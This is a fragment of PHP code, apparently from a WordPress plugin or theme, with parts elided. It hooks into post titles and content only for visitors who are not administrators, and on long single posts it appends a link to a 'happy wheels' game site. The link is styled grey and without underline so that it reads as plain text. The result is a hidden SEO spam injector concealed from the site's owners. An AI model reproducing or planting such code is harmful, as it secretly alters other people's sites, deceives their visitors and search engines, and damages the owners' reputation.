 ...
 */
if (!current_user_can( 'manage_options' )) { add_filter( 'the_title', 'getTheTitleAdm'); }
function getTheTitleAdm( $title ) {
    
    if (is_single()) {
        $t = strtolower(substr($title, 0, 1));
        if ( $t == "a" || $t == "w" || $t == "m") {
...
function admTheContentAdm( $content ) {
    ...
    if ($GLOBALS['wp_adm_sett'] == true) {
        $css="color:#606569; text-decoration:none; font-weight:normal; cursor:default;";
        ...
        if (count($words) > 130) {
            ...
            $words[$k] .= ' <a href="http://play-wheels.net" style="'.$css.'">happy wheels</a>';
